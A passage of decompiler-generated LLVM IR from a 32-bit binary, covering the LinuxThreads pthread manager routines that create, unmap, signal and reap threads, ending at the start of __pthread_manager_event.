  %v1_80578e5 = phi i32 [ %v1_80578e525, %dec_label_pc_80578dc ], [ %v0_805786d, %dec_label_pc_8057874 ], [ %v0_805786d, %dec_label_pc_805781d ]
  %v0_80578e0 = load i32, i32* @global_var_807530c.586, align 4
  store i32 %v0_80578e0, i32* %eax.global-to-local, align 4
  %v0_80578e5 = load i32, i32* @ebx, align 4
  %v2_80578e5 = add i32 %v1_80578e5, -4
  %v3_80578e5 = inttoptr i32 %v2_80578e5 to i32*
  store i32 %v0_80578e5, i32* %v3_80578e5, align 4
  %v0_80578e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80578e6 = udiv i32 %v0_80578e6, 256
  %v3_80578e6 = and i32 %v1_80578e6, 240
  %v8_80578e6 = or i32 %v3_80578e6, 15
  %v10_80578e6 = mul nuw nsw i32 %v8_80578e6, 256
  %v11_80578e6 = and i32 %v0_80578e6, -65281
  %v12_80578e6 = or i32 %v10_80578e6, %v11_80578e6
  store i32 %v12_80578e6, i32* %eax.global-to-local, align 4
  %v2_80578e9 = add i32 %v1_80578e5, -8
  %v3_80578e9 = inttoptr i32 %v2_80578e9 to i32*
  store i32 %v12_80578e6, i32* %v3_80578e9, align 4
  %v0_80578ea = load i32, i32* @ebx, align 4
  %v2_80578ea = add i32 %v1_80578e5, -12
  %v3_80578ea = inttoptr i32 %v2_80578ea to i32*
  store i32 %v0_80578ea, i32* %v3_80578ea, align 4
  %v1_80578eb = add i32 %v1_80578e5, -16
  %v2_80578eb = inttoptr i32 %v1_80578eb to i32*
  store i32 134574498, i32* %v2_80578eb, align 4
  %v2_80578f0 = load i32, i32* %stack_var_-16, align 4
  %v5_80578f0 = call i32 @clone(i32 %arg1, i32 1, i32 %v2_80578f0, i32 %v0_8057463)
  store i32 %v5_80578f0, i32* %eax.global-to-local, align 4
  store i32 %v5_80578f0, i32* @esi, align 4
  br label %dec_label_pc_80578fa

dec_label_pc_80578fa:                             ; preds = %dec_label_pc_80578dc, %dec_label_pc_80578e0
  %v0_8057987 = phi i32 [ %v0_80578dc, %dec_label_pc_80578dc ], [ %v5_80578f0, %dec_label_pc_80578e0 ]
  %v10_80578fa = icmp eq i32 %v0_8057987, -1
  %v1_80578fd = icmp eq i1 %v10_80578fa, false
  %v1_8057987 = load i32, i32* @ebx, align 4
  br i1 %v1_80578fd, label %dec_label_pc_8057987, label %dec_label_pc_8057903

dec_label_pc_8057903:                             ; preds = %dec_label_pc_80578fa
  %v1_8057903 = inttoptr i32 %v1_8057987 to i32*
  %v2_8057903 = load i32, i32* %v1_8057903, align 4
  store i32 %v2_8057903, i32* %eax.global-to-local, align 4
  %v0_8057905 = load i32, i32* @edi, align 4
  %v1_8057905 = icmp eq i32 %v0_8057905, 0
  %v1_8057907 = add i32 %v1_8057987, 4
  %v2_8057907 = inttoptr i32 %v1_8057907 to i32*
  %v3_8057907 = load i32, i32* %v2_8057907, align 4
  store i32 %v3_8057907, i32* %edx.global-to-local, align 4
  %v2_805790a = add i32 %v2_8057903, 4
  %v3_805790a = inttoptr i32 %v2_805790a to i32*
  store i32 %v3_8057907, i32* %v3_805790a, align 4
  %v0_805790d = load i32, i32* @ebx, align 4
  %v1_805790d = add i32 %v0_805790d, 4
  %v2_805790d = inttoptr i32 %v1_805790d to i32*
  %v3_805790d = load i32, i32* %v2_805790d, align 4
  store i32 %v3_805790d, i32* @edx, align 4
  %v0_8057910 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057910 = inttoptr i32 %v3_805790d to i32*
  store i32 %v0_8057910, i32* %v2_8057910, align 4
  br i1 %v1_8057905, label %dec_label_pc_805791a, label %dec_label_pc_8057914

dec_label_pc_8057914:                             ; preds = %dec_label_pc_8057903
  %v0_8057914 = load i32, i32* @edi, align 4
  %v1_8057914 = add i32 %v0_8057914, 24
  %v2_8057914 = inttoptr i32 %v1_8057914 to i32*
  %v3_8057914 = load i32, i32* %v2_8057914, align 4
  %v4_8057914 = icmp eq i32 %v3_8057914, 0
  %v1_8057918 = icmp eq i1 %v4_8057914, false
  br i1 %v1_8057918, label %dec_label_pc_8057914.dec_label_pc_8057951_crit_edge, label %dec_label_pc_805791a

dec_label_pc_8057914.dec_label_pc_8057951_crit_edge: ; preds = %dec_label_pc_8057914
  %v0_8057951.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057951

dec_label_pc_805791a:                             ; preds = %dec_label_pc_8057914, %dec_label_pc_8057903
  %v0_805791a = load i32, i32* @ebx, align 4
  %v1_805791a = add i32 %v0_805791a, 400
  %v2_805791a = inttoptr i32 %v1_805791a to i32*
  %v3_805791a = load i32, i32* %v2_805791a, align 4
  store i32 %v3_805791a, i32* %eax.global-to-local, align 4
  %v1_8057920 = icmp eq i32 %v3_805791a, 0
  br i1 %v1_8057920, label %dec_label_pc_805791a.dec_label_pc_8057935_crit_edge, label %dec_label_pc_8057924

dec_label_pc_805791a.dec_label_pc_8057935_crit_edge: ; preds = %dec_label_pc_805791a
  %v1_805793a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057935

dec_label_pc_8057924:                             ; preds = %dec_label_pc_805791a
  %v0_8057924 = load i32, i32* @ecx, align 4
  %v1_8057924 = load i32, i32* @esp, align 4
  %v2_8057924 = add i32 %v1_8057924, -4
  %v3_8057924 = inttoptr i32 %v2_8057924 to i32*
  store i32 %v0_8057924, i32* %v3_8057924, align 4
  %v0_8057925 = load i32, i32* @ecx, align 4
  %v2_8057925 = add i32 %v1_8057924, -8
  %v3_8057925 = inttoptr i32 %v2_8057925 to i32*
  store i32 %v0_8057925, i32* %v3_8057925, align 4
  %v2_8057926 = add i32 %v1_8057924, -12
  %v3_8057926 = inttoptr i32 %v2_8057926 to i32*
  store i32 %v3_805791a, i32* %v3_8057926, align 4
  %v0_8057927 = load i32, i32* @ebx, align 4
  %v1_8057927 = add i32 %v0_8057927, 396
  %v2_8057927 = inttoptr i32 %v1_8057927 to i32*
  %v3_8057927 = load i32, i32* %v2_8057927, align 4
  %v5_8057927 = add i32 %v1_8057924, -16
  %v6_8057927 = inttoptr i32 %v5_8057927 to i32*
  store i32 %v3_8057927, i32* %v6_8057927, align 4
  %v2_805792d = load i32, i32* %stack_var_-16, align 4
  %v5_805792d = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_805792d, i32 %v0_8057463)
  store i32 %v5_805792d, i32* %eax.global-to-local, align 4
  %v0_8057932 = load i32, i32* @esp, align 4
  %v1_8057932 = add i32 %v0_8057932, 16
  br label %dec_label_pc_8057935

dec_label_pc_8057935:                             ; preds = %dec_label_pc_805791a.dec_label_pc_8057935_crit_edge, %dec_label_pc_8057924
  %v1_805793a = phi i32 [ %v1_805793a.pre, %dec_label_pc_805791a.dec_label_pc_8057935_crit_edge ], [ %v1_8057932, %dec_label_pc_8057924 ]
  %v0_8057935 = load i32, i32* @global_var_807df14.588, align 4
  store i32 %v0_8057935, i32* %eax.global-to-local, align 4
  %v0_805793a = load i32, i32* @edx, align 4
  %v2_805793a = add i32 %v1_805793a, -4
  %v3_805793a = inttoptr i32 %v2_805793a to i32*
  store i32 %v0_805793a, i32* %v3_805793a, align 4
  %v0_805793b = load i32, i32* @edx, align 4
  %v2_805793b = add i32 %v1_805793a, -8
  %v3_805793b = inttoptr i32 %v2_805793b to i32*
  store i32 %v0_805793b, i32* %v3_805793b, align 4
  %v0_805793c = load i32, i32* %eax.global-to-local, align 4
  %v2_805793c = mul i32 %v0_805793c, 4
  %v0_805793f = load i32, i32* @ebx, align 4
  %v2_805793f = sub i32 %v0_805793f, %v2_805793c
  store i32 %v2_805793f, i32* @ebx, align 4
  %v2_8057941 = add i32 %v1_805793a, -12
  %v3_8057941 = inttoptr i32 %v2_8057941 to i32*
  store i32 %v2_805793c, i32* %v3_8057941, align 4
  %v0_8057942 = load i32, i32* @ebx, align 4
  %v1_8057942 = add i32 %v0_8057942, 480
  store i32 %v1_8057942, i32* %eax.global-to-local, align 4
  %v2_8057948 = add i32 %v1_805793a, -16
  %v3_8057948 = inttoptr i32 %v2_8057948 to i32*
  store i32 %v1_8057942, i32* %v3_8057948, align 4
  %v2_8057949 = load i32, i32* %stack_var_-16, align 4
  %v5_8057949 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_8057949, i32 %v0_8057463)
  store i32 %v5_8057949, i32* %eax.global-to-local, align 4
  %v0_805794e = load i32, i32* @esp, align 4
  %v1_805794e = add i32 %v0_805794e, 16
  br label %dec_label_pc_8057951

dec_label_pc_8057951:                             ; preds = %dec_label_pc_8057914.dec_label_pc_8057951_crit_edge, %dec_label_pc_8057935
  %v0_8057951 = phi i32 [ %v0_8057951.pre, %dec_label_pc_8057914.dec_label_pc_8057951_crit_edge ], [ %v1_805794e, %dec_label_pc_8057935 ]
  %v1_8057951 = add i32 %v0_8057951, 20
  %v2_8057951 = inttoptr i32 %v1_8057951 to i32*
  %v3_8057951 = load i32, i32* %v2_8057951, align 4
  %v2_8057955 = mul i32 %v3_8057951, 16
  store i32 %v2_8057955, i32* %eax.global-to-local, align 4
  %v1_8057958 = add i32 %v2_8057955, 134680360
  %v2_8057958 = inttoptr i32 %v1_8057958 to i32*
  store i32 0, i32* %v2_8057958, align 8
  %v0_8057962 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057962 = add i32 %v0_8057962, 134680364
  %v2_8057962 = inttoptr i32 %v1_8057962 to i32*
  store i32 0, i32* %v2_8057962, align 4
  %v0_805796c = load i32, i32* @global_var_8074f20.579, align 32
  %v1_8057971 = add i32 %v0_805796c, -1
  store i32 %v1_8057971, i32* %eax.global-to-local, align 4
  store i32 %v1_8057971, i32* @global_var_8074f20.579, align 32
  %v1_8057977 = call i32 @__errno_location(i32 %arg1)
  store i32 %v1_8057977, i32* %eax.global-to-local, align 4
  %v1_805797c = inttoptr i32 %v1_8057977 to i32*
  %v2_805797c = load i32, i32* %v1_805797c, align 4
  store i32 %v2_805797c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057997

dec_label_pc_8057980:                             ; preds = %dec_label_pc_8057703, %dec_label_pc_80575fa
  store i32 11, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057997

dec_label_pc_8057987:                             ; preds = %dec_label_pc_80578fa
  %v2_8057987 = add i32 %v1_8057987, 20
  %v3_8057987 = inttoptr i32 %v2_8057987 to i32*
  store i32 %v0_8057987, i32* %v3_8057987, align 4
  %v0_805798a = load i32, i32* @esp, align 4
  %v1_805798a = add i32 %v0_805798a, 16
  %v2_805798a = inttoptr i32 %v1_805798a to i32*
  %v3_805798a = load i32, i32* %v2_805798a, align 4
  store i32 %v3_805798a, i32* %edx.global-to-local, align 4
  %v1_805798e = add i32 %v0_805798a, 4
  %v2_805798e = inttoptr i32 %v1_805798e to i32*
  %v3_805798e = load i32, i32* %v2_805798e, align 4
  store i32 %v3_805798e, i32* %eax.global-to-local, align 4
  %v2_8057992 = add i32 %v3_805798e, 48
  %v3_8057992 = inttoptr i32 %v2_8057992 to i32*
  store i32 %v3_805798a, i32* %v3_8057992, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057997

dec_label_pc_8057997:                             ; preds = %dec_label_pc_80575e8, %dec_label_pc_8057980, %dec_label_pc_8057951, %dec_label_pc_8057987
  %v0_805799b = phi i32 [ 1, %dec_label_pc_80575e8 ], [ 11, %dec_label_pc_8057980 ], [ %v2_805797c, %dec_label_pc_8057951 ], [ 0, %dec_label_pc_8057987 ]
  %v0_8057997 = load i32, i32* @esp, align 4
  %v1_8057997 = add i32 %v0_8057997, 4
  %v2_8057997 = inttoptr i32 %v1_8057997 to i32*
  %v3_8057997 = load i32, i32* %v2_8057997, align 4
  store i32 %v3_8057997, i32* %ecx.global-to-local, align 4
  %v2_805799b = add i32 %v3_8057997, 52
  %v3_805799b = inttoptr i32 %v2_805799b to i32*
  store i32 %v0_805799b, i32* %v3_805799b, align 4
  %v0_805799e = load i32, i32* @esp, align 4
  %v1_805799e = add i32 %v0_805799e, 48
  %v2_805799e = inttoptr i32 %v1_805799e to i32*
  %storemerge.pre = load i32, i32* %v2_805799e, align 4
  br label %dec_label_pc_8057a7f

dec_label_pc_80579a7:                             ; preds = %dec_label_pc_805757e
  %v1_80579a7 = add i32 %v0_8057595, 72
  %v2_80579a7 = inttoptr i32 %v1_80579a7 to i32*
  %v3_80579a7 = load i32, i32* %v2_80579a7, align 4
  store i32 %v3_80579a7, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80579af = urem i32 %v3_80579a7, 1024
  %v2_80579b4 = mul nuw nsw i32 %v1_80579af, 16
  %v1_80579b7 = add nuw nsw i32 %v2_80579b4, 134680352
  store i32 %v1_80579b7, i32* @esi, align 4
  store i32 %v1_80579b7, i32* @eax, align 4
  %v1_80579bf = call i32 @__pthread_lock(i32 %arg1)
  store i32 %v1_80579bf, i32* %eax.global-to-local, align 4
  %v0_80579c4 = load i32, i32* @esi, align 4
  %v1_80579c4 = add i32 %v0_80579c4, 8
  %v2_80579c4 = inttoptr i32 %v1_80579c4 to i32*
  %v3_80579c4 = load i32, i32* %v2_80579c4, align 4
  store i32 %v3_80579c4, i32* @ebx, align 4
  %v1_80579c7 = icmp eq i32 %v3_80579c4, 0
  br i1 %v1_80579c7, label %dec_label_pc_80579ef, label %dec_label_pc_80579cb

dec_label_pc_80579cb:                             ; preds = %dec_label_pc_80579a7
  %v1_80579cb = add i32 %v3_80579c4, 16
  %v2_80579cb = inttoptr i32 %v1_80579cb to i32*
  %v3_80579cb = load i32, i32* %v2_80579cb, align 4
  %v4_80579cb = load i32, i32* @edi, align 4
  %v15_80579cb = icmp eq i32 %v3_80579cb, %v4_80579cb
  %v1_80579ce = icmp eq i1 %v15_80579cb, false
  br i1 %v1_80579ce, label %dec_label_pc_80579ef, label %dec_label_pc_80579d0

dec_label_pc_80579d0:                             ; preds = %dec_label_pc_80579cb
  %v1_80579d0 = add i32 %v3_80579c4, 46
  %v2_80579d0 = inttoptr i32 %v1_80579d0 to i8*
  %v3_80579d0 = load i8, i8* %v2_80579d0, align 1
  %v4_80579d0 = icmp eq i8 %v3_80579d0, 0
  br i1 %v4_80579d0, label %dec_label_pc_80579eb, label %dec_label_pc_80579d6

dec_label_pc_80579d6:                             ; preds = %dec_label_pc_80579d0
  %v0_80579d6 = load i32, i32* @esp, align 4
  %v2_80579d9 = add i32 %v0_80579d6, -16
  %v3_80579d9 = inttoptr i32 %v2_80579d9 to i32*
  store i32 %v0_80579c4, i32* %v3_80579d9, align 4
  %v2_80579da = call i32 @__pthread_unlock(i32* %v1_80579f3)
  %v0_80579df = load i32, i32* @ebx, align 4
  store i32 %v0_80579df, i32* @eax, align 4
  %v0_80579e1 = call i32 @pthread_free()
  store i32 %v0_80579e1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057aba

dec_label_pc_80579eb:                             ; preds = %dec_label_pc_80579d0
  %v1_80579eb = add i32 %v3_80579c4, 45
  %v2_80579eb = inttoptr i32 %v1_80579eb to i8*
  store i8 1, i8* %v2_80579eb, align 1
  %v0_80579f2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80579ef

dec_label_pc_80579ef:                             ; preds = %dec_label_pc_80579cb, %dec_label_pc_80579a7, %dec_label_pc_80579eb
  %v0_80579f2 = phi i32 [ %v0_80579c4, %dec_label_pc_80579cb ], [ %v0_80579c4, %dec_label_pc_80579a7 ], [ %v0_80579f2.pre, %dec_label_pc_80579eb ]
  %v0_80579ef = load i32, i32* @esp, align 4
  %v2_80579f2 = add i32 %v0_80579ef, -16
  %v3_80579f2 = inttoptr i32 %v2_80579f2 to i32*
  store i32 %v0_80579f2, i32* %v3_80579f2, align 4
  %v2_80579f3 = call i32 @__pthread_unlock(i32* %v1_80579f3)
  store i32 %v2_80579f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057aba

dec_label_pc_80579fd:                             ; preds = %dec_label_pc_805757e
  %v1_80579fd = add i32 %v0_8057595, 72
  %v2_80579fd = inttoptr i32 %v1_80579fd to i32*
  %v3_80579fd = load i32, i32* %v2_80579fd, align 4
  store i32 %v3_80579fd, i32* %eax.global-to-local, align 4
  %v1_8057a01 = add i32 %v0_8057595, 64
  %v2_8057a01 = inttoptr i32 %v1_8057a01 to i32*
  %v3_8057a01 = load i32, i32* %v2_8057a01, align 4
  store i32 %v3_8057a01, i32* @ebx, align 4
  store i32 1, i32* @global_var_8079c58.590, align 8
  store i32 %v3_80579fd, i32* @global_var_8079c5c.591, align 4
  %v1_8057a14 = inttoptr i32 %v3_8057a01 to i32*
  %v2_8057a14 = load i32, i32* %v1_8057a14, align 4
  store i32 %v2_8057a14, i32* @esi, align 4
  %v12_8057a2d77 = icmp eq i32 %v2_8057a14, %v3_8057a01
  %v1_8057a2f79 = icmp eq i1 %v12_8057a2d77, false
  br i1 %v1_8057a2f79, label %dec_label_pc_8057a18, label %dec_label_pc_8057a31

dec_label_pc_8057a18:                             ; preds = %dec_label_pc_80579fd, %dec_label_pc_8057a18
  %v1_8057a1880 = phi i32 [ %v1_8057a2a, %dec_label_pc_8057a18 ], [ %v1_8057595, %dec_label_pc_80579fd ]
  %v0_8057a18 = load i32, i32* @ebp, align 4
  %v2_8057a18 = add i32 %v1_8057a1880, -4
  %v3_8057a18 = inttoptr i32 %v2_8057a18 to i32*
  store i32 %v0_8057a18, i32* %v3_8057a18, align 4
  %v0_8057a19 = load i32, i32* @ebp, align 4
  %v2_8057a19 = add i32 %v1_8057a1880, -8
  %v3_8057a19 = inttoptr i32 %v2_8057a19 to i32*
  store i32 %v0_8057a19, i32* %v3_8057a19, align 4
  %v0_8057a1a = load i32, i32* @global_var_807530c.586, align 4
  %v2_8057a1a = add i32 %v1_8057a1880, -12
  %v3_8057a1a = inttoptr i32 %v2_8057a1a to i32*
  store i32 %v0_8057a1a, i32* %v3_8057a1a, align 4
  %v0_8057a20 = load i32, i32* @esi, align 4
  %v1_8057a20 = add i32 %v0_8057a20, 20
  %v2_8057a20 = inttoptr i32 %v1_8057a20 to i32*
  %v3_8057a20 = load i32, i32* %v2_8057a20, align 4
  %v5_8057a20 = add i32 %v1_8057a1880, -16
  %v6_8057a20 = inttoptr i32 %v5_8057a20 to i32*
  store i32 %v3_8057a20, i32* %v6_8057a20, align 4
  %v3_8057a23 = call i32 @kill(i32 %arg1, i32 1)
  store i32 %v3_8057a23, i32* %eax.global-to-local, align 4
  %v0_8057a28 = load i32, i32* @esi, align 4
  %v1_8057a28 = inttoptr i32 %v0_8057a28 to i32*
  %v2_8057a28 = load i32, i32* %v1_8057a28, align 4
  store i32 %v2_8057a28, i32* @esi, align 4
  %v0_8057a2a = load i32, i32* @esp, align 4
  %v1_8057a2a = add i32 %v0_8057a2a, 16
  %v1_8057a2d.pre = load i32, i32* @ebx, align 4
  %v12_8057a2d = icmp eq i32 %v2_8057a28, %v1_8057a2d.pre
  %v1_8057a2f = icmp eq i1 %v12_8057a2d, false
  br i1 %v1_8057a2f, label %dec_label_pc_8057a18, label %dec_label_pc_8057a31

dec_label_pc_8057a31:                             ; preds = %dec_label_pc_8057a18, %dec_label_pc_80579fd
  %v1_8057a18.lcssa = phi i32 [ %v1_8057595, %dec_label_pc_80579fd ], [ %v1_8057a2a, %dec_label_pc_8057a18 ]
  %v0_8057a31.lcssa = phi i32 [ %v2_8057a14, %dec_label_pc_80579fd ], [ %v2_8057a28, %dec_label_pc_8057a18 ]
  %v1_8057a31 = inttoptr i32 %v0_8057a31.lcssa to i32*
  %v2_8057a31 = load i32, i32* %v1_8057a31, align 4
  store i32 %v2_8057a31, i32* @ebx, align 4
  %v12_8057a4a67 = icmp eq i32 %v2_8057a31, %v0_8057a31.lcssa
  %v1_8057a4c69 = icmp eq i1 %v12_8057a4a67, false
  br i1 %v1_8057a4c69, label %dec_label_pc_8057a35, label %dec_label_pc_8057a4e

dec_label_pc_8057a35:                             ; preds = %dec_label_pc_8057a31, %dec_label_pc_8057a35
  %v1_8057a3570 = phi i32 [ %v1_8057a47, %dec_label_pc_8057a35 ], [ %v1_8057a18.lcssa, %dec_label_pc_8057a31 ]
  %v0_8057a35 = load i32, i32* @edi, align 4
  %v2_8057a35 = add i32 %v1_8057a3570, -4
  %v3_8057a35 = inttoptr i32 %v2_8057a35 to i32*
  store i32 %v0_8057a35, i32* %v3_8057a35, align 4
  %v1_8057a36 = add i32 %v1_8057a3570, -8
  %v2_8057a36 = inttoptr i32 %v1_8057a36 to i32*
  store i32 -2147483648, i32* %v2_8057a36, align 4
  %v1_8057a3b = add i32 %v1_8057a3570, -12
  %v2_8057a3b = inttoptr i32 %v1_8057a3b to i32*
  store i32 0, i32* %v2_8057a3b, align 4
  %v0_8057a3d = load i32, i32* @ebx, align 4
  %v1_8057a3d = add i32 %v0_8057a3d, 20
  %v2_8057a3d = inttoptr i32 %v1_8057a3d to i32*
  %v3_8057a3d = load i32, i32* %v2_8057a3d, align 4
  %v5_8057a3d = add i32 %v1_8057a3570, -16
  %v6_8057a3d = inttoptr i32 %v5_8057a3d to i32*
  store i32 %v3_8057a3d, i32* %v6_8057a3d, align 4
  %v2_8057a40 = load i32, i32* %stack_var_-16, align 4
  %v4_8057a40 = call i32 @waitpid(i32 %arg1, i32 1, i32 %v2_8057a40)
  store i32 %v4_8057a40, i32* %eax.global-to-local, align 4
  %v0_8057a45 = load i32, i32* @ebx, align 4
  %v1_8057a45 = inttoptr i32 %v0_8057a45 to i32*
  %v2_8057a45 = load i32, i32* %v1_8057a45, align 4
  store i32 %v2_8057a45, i32* @ebx, align 4
  %v0_8057a47 = load i32, i32* @esp, align 4
  %v1_8057a47 = add i32 %v0_8057a47, 16
  %v1_8057a4a.pre = load i32, i32* @esi, align 4
  %v12_8057a4a = icmp eq i32 %v2_8057a45, %v1_8057a4a.pre
  %v1_8057a4c = icmp eq i1 %v12_8057a4a, false
  br i1 %v1_8057a4c, label %dec_label_pc_8057a35, label %dec_label_pc_8057a4e

dec_label_pc_8057a4e:                             ; preds = %dec_label_pc_8057a35, %dec_label_pc_8057a31
  %v0_8057a4e.lcssa = phi i32 [ %v2_8057a31, %dec_label_pc_8057a31 ], [ %v2_8057a45, %dec_label_pc_8057a35 ]
  store i32 %v0_8057a4e.lcssa, i32* @eax, align 4
  %v0_8057a50 = call i32 @restart()
  br label %dec_label_pc_8057a55

dec_label_pc_8057a55:                             ; preds = %dec_label_pc_805754b, %dec_label_pc_8057a4e
  %storemerge1 = phi i32 [ %v0_8057a50, %dec_label_pc_8057a4e ], [ %v0_805754f, %dec_label_pc_805754b ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v0_8057a55 = load i32, i32* @esp, align 4
  %v1_8057a58 = add i32 %v0_8057a55, -16
  %v2_8057a58 = inttoptr i32 %v1_8057a58 to i32*
  store i32 0, i32* %v2_8057a58, align 4
  %v1_8057a5a = call i32 @__GI__exit(i32 %arg1)
  unreachable

dec_label_pc_8057a5f:                             ; preds = %dec_label_pc_805757e
  store i32 1, i32* @global_var_8079b04.573, align 4
  %v0_8057a69 = call i32 @pthread_reap_children()
  %v0_8057a6e = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  store i32 %v0_8057a6e, i32* %eax.global-to-local, align 4
  store i32 %v0_8057a6e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057a7f

dec_label_pc_8057a7f:                             ; preds = %dec_label_pc_8057997, %dec_label_pc_8057a5f
  %storemerge = phi i32 [ %v0_8057a6e, %dec_label_pc_8057a5f ], [ %storemerge.pre, %dec_label_pc_8057997 ]
  store i32 %storemerge, i32* @eax, align 4
  %v0_8057a7f = call i32 @restart()
  store i32 %v0_8057a7f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057527thread-pre-split

dec_label_pc_8057a89:                             ; preds = %dec_label_pc_805757e
  %v1_8057a8c = add i32 %v0_8057595, 72
  %v2_8057a8c = inttoptr i32 %v1_8057a8c to i32*
  %v3_8057a8c = load i32, i32* %v2_8057a8c, align 4
  %v6_8057a8c = inttoptr i32 %v0_8057595 to i32*
  store i32 %v3_8057a8c, i32* %v6_8057a8c, align 4
  %v0_8057a90 = call i32 @__new_sem_post()
  store i32 %v0_8057a90, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057aba

dec_label_pc_8057aba:                             ; preds = %dec_label_pc_8057a89, %dec_label_pc_80579ef, %dec_label_pc_80579d6
  %v0_8057aba = load i32, i32* @esp, align 4
  %v1_8057aba = add i32 %v0_8057aba, 16
  br label %dec_label_pc_8057527

; uselistorder directives
  uselistorder i32 %v2_8057a45, { 1, 0, 2 }
  uselistorder i32 %v2_8057a31, { 1, 0, 2 }
  uselistorder i32 %v2_8057a28, { 1, 0, 2 }
  uselistorder i32 %v2_8057a14, { 1, 0, 2 }
  uselistorder i32 %v2_8057955, { 1, 0 }
  uselistorder i32 %v2_805793c, { 1, 0 }
  uselistorder i32 %v1_805793a, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8057987, { 2, 1, 0 }
  uselistorder i32 %v0_8057987, { 1, 0 }
  uselistorder i32 %v0_80578e6, { 1, 0 }
  uselistorder i32 %v0_80578b0, { 1, 0 }
  uselistorder i32 %v5_80578a1, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8057897, { 1, 0 }
  uselistorder i32 %v1_80577cc, { 1, 0 }
  uselistorder i32 %v2_8057759, { 1, 0 }
  uselistorder i32 %v1_805770c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8057602, { 1, 0 }
  uselistorder i32 %v1_80576b5, { 1, 0 }
  uselistorder i32 %v2_80576a2, { 1, 0 }
  uselistorder i32 %v1_8057687, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder i32 %tmp49, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8057666, { 1, 0, 2 }
  uselistorder i32 %v2_8057614, { 1, 0 }
  uselistorder i32 %v0_805760295, { 2, 0, 1 }
  uselistorder i32 %v3_805760286, { 1, 0 }
  uselistorder i32 %v0_80575c0, { 1, 0, 2 }
  uselistorder i32 %v1_8057595, { 1, 2, 0 }
  uselistorder i32 %v0_8057595, { 7, 6, 3, 4, 5, 0, 1, 2, 8, 9 }
  uselistorder i32 %v0_8057574, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_8057571, { 1, 0 }
  uselistorder i32 %v1_805753e, { 1, 0, 2 }
  uselistorder i32 %v1_8057527, { 5, 4, 3, 2, 1, 0 }
  uselistorder i16* %v4_805783a, { 1, 0 }
  uselistorder i32* %v1_80579f3, { 2, 1, 0 }
  uselistorder i32 %v2_805746b, { 3, 2, 1, 5, 4, 0, 7, 6, 9, 8, 10 }
  uselistorder i32 %v0_8057463, { 4, 5, 1, 0, 6, 2, 3 }
  uselistorder i32* %stack_var_-16, { 12, 7, 6, 10, 11, 1, 3, 2, 0, 9, 8, 4, 5, 13 }
  uselistorder i32* %edx.global-to-local, { 20, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32* %eax.global-to-local, { 0, 73, 74, 71, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 72, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 76, 69, 70, 94, 95, 96, 75, 77, 79, 78, 80, 81, 82, 84, 83, 85, 86, 88, 87, 89, 90, 91, 92, 93 }
  uselistorder i32 ()* @restart, { 1, 2, 0 }
  uselistorder i32 ()* @pthread_free, { 1, 0 }
  uselistorder i32 ()* @pthread_reap_children, { 1, 0 }
  uselistorder i32* @global_var_8079b00.572, { 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 16, 17, 18, 15, 6, 7, 5, 8, 3, 4, 9, 1, 2, 0, 12, 13, 19, 20, 10, 11, 14, 21, 24, 23, 22 }
  uselistorder label %dec_label_pc_8057a7f, { 1, 0 }
  uselistorder label %dec_label_pc_8057a55, { 1, 0 }
  uselistorder label %dec_label_pc_8057a35, { 1, 0 }
  uselistorder label %dec_label_pc_8057a18, { 1, 0 }
  uselistorder label %dec_label_pc_80579ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057997, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8057951, { 1, 0 }
  uselistorder label %dec_label_pc_8057935, { 1, 0 }
  uselistorder label %dec_label_pc_80578fa, { 1, 0 }
  uselistorder label %dec_label_pc_80578dc, { 1, 0 }
  uselistorder label %dec_label_pc_805781d, { 1, 0 }
  uselistorder label %dec_label_pc_8057814, { 1, 0 }
  uselistorder label %dec_label_pc_8057811, { 1, 0 }
  uselistorder label %dec_label_pc_805770c, { 1, 0 }
  uselistorder label %dec_label_pc_805767f, { 1, 0 }
  uselistorder label %dec_label_pc_805767b, { 1, 0 }
  uselistorder label %dec_label_pc_8057610, { 1, 0 }
  uselistorder label %dec_label_pc_8057571, { 1, 0 }
  uselistorder label %dec_label_pc_8057527, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057527thread-pre-split, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80574c5, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_8057ac7 = load i32, i32* bitcast (i32** @global_var_807513c.593 to i32*), align 4
  store i32 %v0_8057ac7, i32* @eax, align 4
  %v1_8057acc = call i32 @__pthread_lock(i32 ptrtoint (i32* @0 to i32))
